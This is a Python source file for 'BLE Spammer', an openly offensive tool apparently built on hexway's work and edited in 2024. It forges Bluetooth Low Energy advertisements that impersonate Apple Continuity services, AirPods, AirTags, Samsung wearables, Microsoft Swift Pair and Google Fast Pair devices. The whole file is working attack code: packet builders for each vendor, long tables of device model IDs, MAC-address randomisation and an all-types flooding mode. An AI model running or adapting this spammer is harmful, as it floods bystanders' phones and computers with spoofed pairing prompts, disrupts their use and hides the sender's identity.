#!/usr/bin/env python3
# Author: Dmitry Chastuhin
# Twitter: https://twitter.com/_chipik

# web: https://hexway.io
# Twitter: https://twitter.com/_hexway

# 2024 edit + samsung + apple random + microsoft swift
# Pat (8L4CK)
# hciconfig hci0 inqtpl 20
import random
import hashlib
import argparse
from sys import exit
from time import sleep
from datetime import datetime
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)
import subprocess

# ============================== HELP
# -- HEADER
help_desc = '''
BLE Spammer

(c) 8L4CK 2024
-t:
    apple - Sends Apple BLE services data
    apple1
    airpods - Sends AirPods BLE data
    airpods1
    samsung - Sends Samsung Galaxy watch BLE data
    swift - Sends SwiftPair message
    google - Sends Google BLE data
    shitstorm - Send all
'''

# ============================== EOF HELP

parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-t', '--type', default="", type=str, help='type of attack')
parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
parser.add_argument('-s', '--sleep', default=1.0, type=float, help='Sleep between advertise')
parser.add_argument('-m', '--message', default='', type=str, help='Swift broadcast message')
parser.add_argument('-d', '--hcidev', default=0, type=int, help='HCI device index')
parser.add_argument('-n', '--index', default=-1, type=int, help='Apple/Samsung device index')

parser.add_argument('-l', '--list', action='store_true', help='list devices for samsung/apple/airpods')
parser.add_argument('-p', '--parsable', action='store_true', help='parsable list devices for samsung/apple/airpods')

parser.add_argument('-c', '--clear', action='store_true', help='clear advertise')
parser.add_argument('-r', '--randmac', action='store_true', help='Randomize MAC')

args = parser.parse_args()

if args.clear:
    print("Clear advertising on device %i" % args.hcidev)
    toggle_device(args.hcidev, True)
    try:
        sock = bluez.hci_open_dev(args.hcidev)
    except:
        print("Cannot open bluetooth device %i" % args.hcidev)
        raise
    start_le_advertising(sock, adv_type=0x03, min_interval=40, max_interval=args.interval, data=(0x00, 0x00))
    sleep(0.1)
    stop_le_advertising(sock)
    sleep(0.1)
    exit()

models = {
    "apple": [
    #(0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, SERVICE, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)
        (0x01, "AppleTV Setup"),
        (0x06, "AppleTV Pair"),
        (0x20, "AppleTV New User"),
        (0x2b, "AppleTV AppleID Setup"),
        (0xc0, "AppleTV Wireless Audio Sync"),
        (0x0d, "AppleTV Homekit Setup"),
        (0x13, "AppleTV Keyboard"),
        (0x27, "AppleTV 'Connecting to Network'"),
        (0x0b, "Homepod Setup"),
        (0x09, "Setup New Phone"),
        (0x02, "Transfer Number to New Phone"),
        (0x1e, "TV Color Balance"),
    ],
    "airpods": [
    #(0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, AIRPODS_MODEL, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
        (0x02, "Airpods"),
        (0x0e, "Airpods Pro"),
        (0x0a, "Airpods Max"),
        (0x0f, "Airpods Gen 2"),
        (0x13, "Airpods Gen 3"),
        (0x14, "Airpods Pro Gen 2"),
        (0x03, "PowerBeats"),
        (0x0b, "PowerBeats Pro"),
        (0x0c, "Beats Solo Pro"),
        (0x11, "Beats Studio Buds"),
        (0x10, "Beats Flex"),
        (0x05, "BeatsX"),
        (0x06, "Beats Solo3"),
        (0x09, "Beats Studio3"),
        (0x17, "Beats Studio Pro"),
        (0x12, "Beats Fit Pro"),
        (0x16, "Beats Studio Buds+"),
    ],
    "samsung": [
    #(0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, GALAXY_MODEL)
        (0x1A, "Fallback Watch"),
        (0x01, "White Watch4 Classic 44m"),
        (0x02, "Black Watch4 Classic 40m"),
        (0x03, "White Watch4 Classic 40m"),
        (0x04, "Black Watch4 44mm"),
        (0x05, "Silver Watch4 44mm"),
        (0x06, "Green Watch4 44mm"),
        (0x07, "Black Watch4 40mm"),
        (0x08, "White Watch4 40mm"),
        (0x09, "Gold Watch4 40mm"),
        (0x0A, "French Watch4"),
        (0x0B, "French Watch4 Classic"),
        (0x0C, "Fox Watch5 44mm"),
        (0x11, "Black Watch5 44mm"),
        (0x12, "Sapphire Watch5 44mm"),
        (0x13, "Purpleish Watch5 40mm"),
        (0x14, "Gold Watch5 40mm"),
        (0x15, "Black Watch5 Pro 45mm"),
        (0x16, "Gray Watch5 Pro 45mm"),
        (0x17, "White Watch5 44mm"),
        (0x18, "White & Black Watch5"),
        (0x1B, "Black Watch6 Pink 40mm"),
        (0x1C, "Gold Watch6 Gold 40mm"),
        (0x1D, "Silver Watch6 Cyan 44mm"),
        (0x1E, "Black Watch6 Classic 43m"),
        (0x20, "Green Watch6 Classic 43m"),
    ],
    "samsungbuds": [
        (0xEE7A0C, "Fallback Buds"),
        (0x9D1700, "Fallback Dots"),
        (0x39EA48, "Light Purple Buds2"),
        (0xA7C62C, "Bluish Silver Buds2"),
        (0x850116, "Black Buds Live"),
        (0x3D8F41, "Gray & Black Buds2"),
        (0x3B6D02, "Bluish Chrome Buds2"),
        (0xAE063C, "Gray Beige Buds2"),
        (0xB8B905, "Pure White Buds"),
        (0xEAAA17, "Pure White Buds2"),
        (0xD30704, "Black Buds"),
        (0x9DB006, "French Flag Buds"),
        (0x101F1A, "Dark Purple Buds Live"),
        (0x859608, "Dark Blue Buds"),
        (0x8E4503, "Pink Buds"),
        (0x2C6740, "White & Black Buds2"),
        (0x3F6718, "Bronze Buds Live"),
        (0x42C519, "Red Buds Live"),
        (0xAE073A, "Black & White Buds2"),
        (0x011716, "Sleek Black Buds2"),
    ],
    "google": [
        # Genuine non-production/forgotten (good job Google)
        (0x0001F0, "Bisto CSR8670 Dev Board"),
        (0x000047, "Arduino 101"),
        (0x470000, "Arduino 101 2"),
        (0x00000A, "Anti-Spoof Test"),
        (0x0A0000, "Anti-Spoof Test 2"),
        (0x00000B, "Google Gphones"),
        (0x0B0000, "Google Gphones 2"),
        (0x0C0000, "Google Gphones 3"),
        (0x00000D, "Test 00000D"),
        (0x000007, "Android Auto"),
        (0x070000, "Android Auto 2"),
        (0x000008, "Foocorp Foophones"),
        (0x080000, "Foocorp Foophones 2"),
        (0x000009, "Test Android TV"),
        (0x090000, "Test Android TV 2"),
        (0x000035, "Test 000035"),
        (0x350000, "Test 000035 2"),
        (0x000048, "Fast Pair Headphones"),
        (0x480000, "Fast Pair Headphones 2"),
        (0x000049, "Fast Pair Headphones 3"),
        (0x490000, "Fast Pair Headphones 4"),
        (0x001000, "LG HBS1110"),
        (0x00B727, "Smart Controller 1"),
        (0x01E5CE, "BLE-Phone"),
        (0x0200F0, "Goodyear"),
        (0x00F7D4, "Smart Setup"),
        (0xF00002, "Goodyear"),
        (0xF00400, "T10"),
        (0x1E89A7, "ATS2833_EVB"),

        # Phone setup
        (0x00000C, "Google Gphones Transfer"),
        (0x0577B1, "Galaxy S23 Ultra"),
        (0x05A9BC, "Galaxy S20+"),

        # Genuine devices
        (0xCD8256, "Bose NC 700"),
        (0x0000F0, "Bose QuietComfort 35 II"),
        (0xF00000, "Bose QuietComfort 35 II 2"),
        (0x821F66, "JBL Flip 6"),
        (0xF52494, "JBL Buds Pro"),
        (0x718FA4, "JBL Live 300TWS"),
        (0x0002F0, "JBL Everest 110GA"),
        (0x92BBBD, "Pixel Buds"),
        (0x000006, "Google Pixel buds"),
        (0x060000, "Google Pixel buds 2"),
        (0xD446A7, "Sony XM5"),
        (0x2D7A23, "Sony WF-1000XM4"),
        (0x0E30C3, "Razer Hammerhead TWS"),
        (0x72EF8D, "Razer Hammerhead TWS X"),
        (0x72FB00, "Soundcore Spirit Pro GVA"),
        (0x0003F0, "LG HBS-835S"),
        (0x002000, "AIAIAI TMA-2 (H60)"),
        (0x003000, "Libratone Q Adapt On-Ear"),
        (0x003001, "Libratone Q Adapt On-Ear 2"),
        (0x00A168, "boAt  Airdopes 621"),
        (0x00AA48, "Jabra Elite 2"),
        (0x00AA91, "Beoplay E8 2.0"),
        (0x00C95C, "Sony WF-1000X"),
        (0x01EEB4, "WH-1000XM4"),
        (0x02AA91, "B&O Earset"),
        (0x01C95C, "Sony WF-1000X"),
        (0x02D815, "ATH-CK1TW"),
        (0x035764, "PLT V8200 Series"),
        (0x038CC7, "JBL TUNE760NC"),
        (0x02DD4F, "JBL TUNE770NC"),
        (0x02E2A9, "TCL MOVEAUDIO S200"),
        (0x035754, "Plantronics PLT_K2"),
        (0x02C95C, "Sony WH-1000XM2"),
        (0x038B91, "DENON AH-C830NCW"),
        (0x02F637, "JBL LIVE FLEX"),
        (0x02D886, "JBL REFLECT MINI NC"),
        (0xF00000, "Bose QuietComfort 35 II"),
        (0xF00001, "Bose QuietComfort 35 II"),
        (0xF00201, "JBL Everest 110GA"),
        (0xF00204, "JBL Everest 310GA"),
        (0xF00209, "JBL LIVE400BT"),
        (0xF00205, "JBL Everest 310GA"),
        (0xF00200, "JBL Everest 110GA"),
        (0xF00208, "JBL Everest 710GA"),
        (0xF00207, "JBL Everest 710GA"),
        (0xF00206, "JBL Everest 310GA"),
        (0xF0020A, "JBL LIVE400BT"),
        (0xF0020B, "JBL LIVE400BT"),
        (0xF0020C, "JBL LIVE400BT"),
        (0xF00203, "JBL Everest 310GA"),
        (0xF00202, "JBL Everest 110GA"),
        (0xF00213, "JBL LIVE650BTNC"),
        (0xF0020F, "JBL LIVE500BT"),
        (0xF0020E, "JBL LIVE500BT"),
        (0xF00214, "JBL LIVE650BTNC"),
        (0xF00212, "JBL LIVE500BT"),
        (0xF0020D, "JBL LIVE400BT"),
        (0xF00211, "JBL LIVE500BT"),
        (0xF00215, "JBL LIVE650BTNC"),
        (0xF00210, "JBL LIVE500BT"),
        (0xF00305, "LG HBS-1500"),
        (0xF00304, "LG HBS-1010"),
        (0xF00308, "LG HBS-1125"),
        (0xF00303, "LG HBS-930"),
        (0xF00306, "LG HBS-1700"),
        (0xF00300, "LG HBS-835S"),
        (0xF00309, "LG HBS-2000"),
        (0xF00302, "LG HBS-830"),
        (0xF00307, "LG HBS-1120"),
        (0xF00301, "LG HBS-835"),
        (0xF00E97, "JBL VIBE BEAM"),
        (0x04ACFC, "JBL WAVE BEAM"),
        (0x04AA91, "Beoplay H4"),
        (0x04AFB8, "JBL TUNE 720BT"),
        (0x05A963, "WONDERBOOM 3"),
        (0x05AA91, "B&O Beoplay E6"),
        (0x05C452, "JBL LIVE220BT"),
        (0x05C95C, "Sony WI-1000X"),
        (0x0602F0, "JBL Everest 310GA"),
        (0x0603F0, "LG HBS-1700"),
        (0x1E8B18, "SRS-XB43"),
        (0x1E955B, "WI-1000XM2"),
        (0x1EC95C, "Sony WF-SP700N"),
        (0x1ED9F9, "JBL WAVE FLEX"),
        (0x1EE890, "ATH-CKS30TW WH"),
        (0x1EEDF5, "Teufel REAL BLUE TWS 3"),
        (0x1F1101, "TAG Heuer Calibre E4 45mm"),
        (0x1F181A, "LinkBuds S"),
        (0x1F2E13, "Jabra Elite 2"),
        (0x1F4589, "Jabra Elite 2"),
        (0x1F4627, "SRS-XG300"),
        (0x1F5865, "boAt Airdopes 441"),
        (0x1FBB50, "WF-C700N"),
        (0x1FC95C, "Sony WF-SP700N"),
        (0x1FE765, "TONE-TF7Q"),
        (0x1FF8FA, "JBL REFLECT MINI NC"),
        (0x201C7C, "SUMMIT"),
        (0x202B3D, "Amazfit PowerBuds"),
        (0x20330C, "SRS-XB33"),
        (0x003B41, "M&D MW65"),
        (0x003D8A, "Cleer FLOW II"),
        (0x005BC3, "Panasonic RP-HD610N"),
        (0x008F7D, "soundcore Glow Mini"),
        (0x00FA72, "Pioneer SE-MS9BN"),
        (0x0100F0, "Bose QuietComfort 35 II"),
        (0x011242, "Nirvana Ion"),
        (0x013D8A, "Cleer EDGE Voice"),
        (0x01AA91, "Beoplay H9 3rd Generation"),
        (0x038F16, "Beats Studio Buds"),
        (0x039F8F, "Michael Kors Darci 5e"),
        (0x03AA91, "B&O Beoplay H8i"),
        (0x03B716, "YY2963"),
        (0x03C95C, "Sony WH-1000XM2"),
        (0x03C99C, "MOTO BUDS 135"),
        (0x03F5D4, "Writing Account Key"),
        (0x045754, "Plantronics PLT_K2"),
        (0x045764, "PLT V8200 Series"),
        (0x04C95C, "Sony WI-1000X"),
        (0x050F0C, "Major III Voice"),
        (0x052CC7, "MINOR III"),
        (0x057802, "TicWatch Pro 5"),
        (0x0582FD, "Pixel Buds"),
        (0x058D08, "WH-1000XM4"),
        (0x06AE20, "Galaxy S21 5G"),
        (0x06C197, "OPPO Enco Air3 Pro"),
        (0x06C95C, "Sony WH-1000XM2"),
        (0x06D8FC, "soundcore Liberty 4 NC"),
        (0x0744B6, "Technics EAH-AZ60M2"),
        (0x07A41C, "WF-C700N"),
        (0x07C95C, "Sony WH-1000XM2"),
        (0x07F426, "Nest Hub Max"),
        (0x0102F0, "JBL Everest 110GA - Gun Metal"),
        (0x0202F0, "JBL Everest 110GA - Silver"),
        (0x0302F0, "JBL Everest 310GA - Brown"),
        (0x0402F0, "JBL Everest 310GA - Gun Metal"),
        (0x0502F0, "JBL Everest 310GA - Silver"),
        (0x0702F0, "JBL Everest 710GA - Gun Metal"),
        (0x0802F0, "JBL Everest 710GA - Silver"),
        (0x054B2D, "JBL TUNE125TWS"),
        (0x0660D7, "JBL LIVE770NC"),
        (0x0103F0, "LG HBS-835"),
        (0x0203F0, "LG HBS-830"),
        (0x0303F0, "LG HBS-930"),
        (0x0403F0, "LG HBS-1010"),
        (0x0503F0, "LG HBS-1500"),
        (0x0703F0, "LG HBS-1120"),
        (0x0803F0, "LG HBS-1125"),
        (0x0903F0, "LG HBS-2000")
    ]
}

# print list
if args.list or args.parsable:
    # list apple services
    if args.type == "apple" or args.type == "":
        if args.type == "" and args.parsable == False:
            print("\n(-t apple) Apple services:")
        ai=0
        for code,apple in models.get("apple"):
            if args.parsable:
                print("apple;" + str(ai) + ";" + apple)
            else:
                print(str(ai) + ": " + apple)
            ai+=1
    # list apple airpods models
    if args.type == "airpods" or args.type == "":
        if args.type == "" and args.parsable == False:
            print("\n(-t airpods) Apple AirPods models:")
        ai=0
        for code, apple in models.get("airpods"):
            if args.parsable:
                print("airpods;" + str(ai) + ";" + apple)
            else:
                print(str(ai) + ": " + apple)
            ai+=1
    # list samsung watch
    if args.type == "samsung" or args.type == "":
        if args.type == "" and args.parsable == False:
            print("\n(-t samsung) Samsung Galaxy Watch models:")
        ai=0
        for code,watch in models.get("samsung"):
            if args.parsable:
                print("samsung;" + str(ai) + ";" + watch)
            else:
                print(str(ai) + ": " + watch)
            ai+=1
    # list samsung buds
    if args.type == "samsungbuds" or args.type == "":
        if args.type == "" and args.parsable == False:
            print("\n(-t samsungbuds) Samsung buds models:")
        ai=0
        for code,buds in models.get("samsungbuds"):
            if args.parsable:
                print("samsungbuds;" + str(ai) + ";" + buds)
            else:
                print(str(ai) + ": " + buds)
            ai+=1
    # list android pair
    if args.type == "google" or args.type == "":
        if args.type == "" and args.parsable == False:
            print("\n(-t google) Android fastpair devices:")
        ai=0
        for code,dev in models.get("google"):
            if args.parsable:
                print("google;" + str(ai) + ";" + dev)
            else:
                print(str(ai) + ": " + dev)
            ai+=1
    exit()

rand = True

myTypes = ['apple', 'apple1', 'airpods', 'airpods1', 'airtag', 'airdrop', 'airplay', 'samsung', 'samsungbuds', 'swift', 'google', 'applejuice'];
shitstorm = False
shitstormI=0
if args.type not in myTypes: 
    if args.type == "shitstorm":
        shitstorm = True
    else:
        print("%s is unknown spam type" % args.type)
        exit()

msg = []
if args.message != '':
    msg = [ord(c) for c in args.message]
    rand = False

if args.index > -1:
    rand = False

applejuice = False
if args.type == "applejuice":
    args.sleep = 0.25
    applejuice = True


def appleHeader(appletype):
    appleHeaders = {
        'ContinuityTypeAirDrop':        ( 18, 0x05 ),
        'ContinuityTypeProximityPair':  ( 25, 0x07 ),
        'ContinuityTypeAirplayTarget':  (  6, 0x09 ),
        'ContinuityTypeHandoff':        ( 14, 0x0C ),
        'ContinuityTypeTetheringSource':(  6, 0x0E ),
        'ContinuityTypeNearbyAction':   (  5, 0x0F ),
        'ContinuityTypeNearbyInfo':     (  5, 0x10 ),
    }
    size = 6 + appleHeaders.get(appletype)[0]
    return (

                size - 1,
                0xff,
                0x4c,
                0x00,
                appleHeaders.get(appletype)[1], #cont. type ContinuityTypeProximityPair
                size - 6 - 1,
            )
def randIntTuple(l, mi=0, ma=255):
    tpl = ()
    for x in range(l):
        tpl+= (random.randint(mi, ma), )
    return tpl

def randomizeMac(d):
    addr = "%02x:%02x:%02x:%02x:%02x:%02x" % (random.randint(0, 255),
                             random.randint(0, 255),
                             random.randint(0, 255),
                             random.randint(0, 255),
                             random.randint(0, 255),
                             random.randint(0, 255))
    subprocess.run(["bdaddr", "-i" , "hci"+str(d) , addr])
    print("hci"+str(d) + ": " + addr)


# =================================================================
packetTitle=''
packet=()
dev_id = args.hcidev  # the bluetooth device is hci0
toggle_device(dev_id, True)

try:
    sock = bluez.hci_open_dev(dev_id)
except:
    print("Cannot open bluetooth device %i" % dev_id)
    raise


if rand:
    print("Random mode...")
    while True:
        if args.randmac:
            randomizeMac(dev_id)
            sleep(0.2)
        try:
            sock = bluez.hci_open_dev(dev_id)
        except:
            print("Cannot open bluetooth device %i" % dev_id)
            raise

        packetTitle=''
        packet=()
        if applejuice == True:
            args.type = random.choice(['apple', 'airpods', 'apple1', 'airpods1', 'airtag'])
        #==============================Packet creator...
        if shitstorm == True:
            args.type = myTypes[shitstormI]
            
        #-------- AppleJuice (Apple services)
        if args.type == "apple":
            #types = [ 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 ]
            select = random.choice(models.get("apple")) # [ 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 ]
            packetTitle = "AppleJuice: " + select[1]
            packet = (
                        16, # size
                        0xff, 0x4c, 0x00, 0x0f, 0x05, 0xc1, 
                        select[0], # type
                    ) + randIntTuple(3) + (0x00, 0x00, 0x10,) + randIntTuple(3)

        # AirTag proximity
        elif args.type == "airtag":
            #Prefix (paired 0x01 new 0x07 airtag 0x05)
            prefix = [
                        (0x01, "Paired"), 
                        (0x07, "New"), 
                        (0x05, "Airtag")
                    ][2]
            model = [
                        (0x0055, "Airtag"),
                        (0x0030, "Hermes Airtag"),
                    ][random.randint(0,1)]
            packetTitle = "Airtag " + model[1]

            packet = appleHeader('ContinuityTypeProximityPair') + (  
                        #data
                        prefix[0],
                        (model[0] >> 0x08) & 0xFF,
                        (model[0] >> 0x00) & 0xFF,
                        0x55, # status
                        random.randint(128, 255), # left speaker
                        random.randint(128, 255), # right speaker
                        random.randint(128, 255), # case
                        0x00,
                        0x00,
                    )
            packet+= randIntTuple(16)
        # AirDrop proximity
        elif args.type == "airdrop":
                packetTitle = "Airdrop" 
                data = (0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,)
                packet = appleHeader('ContinuityTypeAirDrop') + data + randIntTuple(8) + (0x00, )

        # AirPlay proximity
        elif args.type == "airplay":
                packetTitle = "AirPlay" 
                packet = appleHeader('ContinuityTypeAirplayTarget') + randIntTuple(2) + randIntTuple(4, 1, 240)

        #-------- AppleJuice (Apple services) - from table
        elif args.type == "apple1":
            select = random.choice(models.get("apple"))
            packetTitle = "AppleJuice: " + select[1]
            packet = (
                            0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 
                            select[0], 
                            0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
                    )
        
        #-------- AairPods
        elif args.type == "airpods":
            select = random.choice(models.get("airpods"))
            packetTitle = "Airpods: " + select[1]
            packet = (
                            0x1e, 0xff, 0x4c, 0x00, 0x07, # header
                            select[0], # type // default 0x19
                            0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, # data
                            random.randint(1, 100), # left speaker
                            random.randint(1, 100), # right speaker
                            random.randint(128, 228), # case
                            0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a
                        )
        #-------- AairPods - from table
        elif args.type == "airpods1":
            select = random.choice(models.get("airpods"))
            packetTitle = "AirPods: " + select[1]
            packet = (
                        0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 
                        select[0], 
                        0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                        )

        #-------- Samsung Galaxy Watch
        elif args.type == "samsung":
            select = random.choice(models.get("samsung"))
            model = (select[0] >> 0x00) & 0xFF
            packetTitle = "Samsung Watch: " + select[1]
            packet = (
                        0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, 
                        model
                    )

        #-------- Samsung Buds
        elif args.type == "samsungbuds":
            select = random.choice(models.get("samsungbuds"))
            packetTitle = "Samsung Buds: " + select[1]
            packet = (
                        27, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 
                        (select[0] >> 0x10) & 0xFF, 
                        (select[0] >> 0x08) & 0xFF, 
                        0x01, 
                        (select[0] >> 0x00) & 0xFF, 
                        0x06, 0x3c, 0x94, 0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00, 16, 0xff, 0x75
                    )


        #-------- Microsoft swift pair
        elif args.type == "swift":
            r0 = random.randint(65, 90)
            r1 = random.randint(65, 90)
            r2 = random.randint(65, 90)
            r3 = random.randint(65, 90)
            packetTitle="SwiftPair: "
            packetTitle+= chr(r0)
            packetTitle+= chr(r1)
            packetTitle+= chr(r2)
            packetTitle+= chr(r3)
            packet = (
                        0x0a,
                        0xff,0x06,0x00,0x03,0x00,0x80, # data
                        r0, r1, r2, r3
                    )
        #-------- Google - flipper mod
        elif args.type == "google":
            #https://github.com/RogueMaster/flipperzero-firmware-wPlugins/blob/3cb7a817b1bc5269203a0322ae85b412802aa5ec/applications/external/ble_spam/protocols/fastpair.c#L239
            select = random.choice(models.get("google"))
            signal = random.randint(0, 254)
            packetTitle = "Google: " + select[1]
            packet = (
                        3, 0x03, 0x2c, 0xfe, 6, 0x16, 0x2c, 0xfe, 
                        (select[0] >> 0x10) & 0xFF, 
                        (select[0] >> 0x08) & 0xFF, 
                        (select[0] >> 0x00) & 0xFF, 
                        2, 0x0a, 
                        signal 
                    )
        #-------- Google ??
        elif args.type == "googleOOOOOLD": #
            #v1 = rand() % 100;         // v1 in the range 0 to 99
            #(rand() % 120) - 100
            signal = random.randint(0, 254)
            packetTitle="Google device"
            packet = (3, 0x03, 0x2c, 0xfe, 6, 0x16, 0x2c, 0xfe, 0x00, 0x92, 0xbb, 0xbd, 0x0a, signal )
        # ====== advertise data
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        print(current_time + " BLE: %s" % packetTitle)
        start_le_advertising(sock, adv_type=0x03, min_interval=40, max_interval=args.interval, data=packet)
        sleep(0.1)
        stop_le_advertising(sock)
        
        if shitstorm == True:
            shitstormI = random.randint(0, 6)

        
        sleep(args.sleep)
else:
    print("Static mode")
    try:
        #-------- SwiftPair message
        if args.type == "swift":
            packetTitle="SwiftPair: " + args.message
            packet = ( 7 + len(msg) - 1, )
            packet+= (0xff,0x06,0x00,0x03,0x00,0x80,) # data
            for m in msg:
                packet+=(m, )
        #-------- AppleJuice (Apple services) - from table
        elif args.type == "apple":
            packetTitle = "AppleJuice: " + models.get("apple")[args.index][1]
            packet = (
                        0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 
                        models.get("apple")[args.index][0], 
                        0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
                    )
        #-------- AairPods - from table
        elif args.type == "airpods":
            packetTitle = "AirPods: " + models.get("airpods")[args.index][1]
            packet = (
                        0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 
                        models.get("airpods")[args.index][0], 
                        0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                    )
        # AirTag proximity
        elif args.type == "airtag":
            #Prefix (paired 0x01 new 0x07 airtag 0x05)
            model = [
                        (0x0055, "Airtag"),
                        (0x0030, "Hermes Airtag"),
                    ][args.index]
            packetTitle = "Airtag " + model[1]

            packet = appleHeader('ContinuityTypeProximityPair') + (  
                        #data
                        0x05,
                        (model[0] >> 0x08) & 0xFF,
                        (model[0] >> 0x00) & 0xFF,
                        0x55, # status
                        random.randint(128, 255), # left speaker
                        random.randint(128, 255), # right speaker
                        random.randint(128, 255), # case
                        0x00,
                        0x00,
                    )
            packet+= randIntTuple(16)
        # AirDrop proximity
        elif args.type == "airdrop":
                packetTitle = "Airdrop" 
                data = (0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,)
                packet = appleHeader('ContinuityTypeAirDrop') + data + randIntTuple(8) + (0x00, )
         #-------- Samsung Galaxy Watch
        elif args.type == "samsung":
            model = (models.get("samsung")[args.index][0] >> 0x00) & 0xFF
            packetTitle = "Samsung Watch: " + models.get("samsung")[args.index][1]
            packet = (
                        0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, 
                        model
                    )
        #-------- Samsung Buds
        elif args.type == "samsungbuds":
            select = models.get("samsungbuds")[args.index]
            packetTitle = "Samsung Buds: " + select[1]
            packet = (
                        27, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 
                        (select[0] >> 0x10) & 0xFF, 
                        (select[0] >> 0x08) & 0xFF, 
                        0x01, 
                        (select[0] >> 0x00) & 0xFF, 
                        0x06, 0x3c, 0x94, 0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00, 16, 0xff, 0x75
                    )
        #-------- Android fastpair
        elif args.type == "google":
            select = models.get("google")[args.index]
            signal = random.randint(0, 254)
            packetTitle = "Google: " + select[1]
            packet = (
                        3, 0x03, 0x2c, 0xfe, 6, 0x16, 0x2c, 0xfe, 
                        (select[0] >> 0x10) & 0xFF, 
                        (select[0] >> 0x08) & 0xFF, 
                        (select[0] >> 0x00) & 0xFF, 
                        2, 0x0a, 
                        signal 
                    )

        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        print(current_time + " BLE: %s" % packetTitle)
        start_le_advertising(sock, adv_type=0x03, min_interval=40, max_interval=args.interval, data=packet)
        while True:
            sleep(2)
    except:
        stop_le_advertising(sock)
        raise
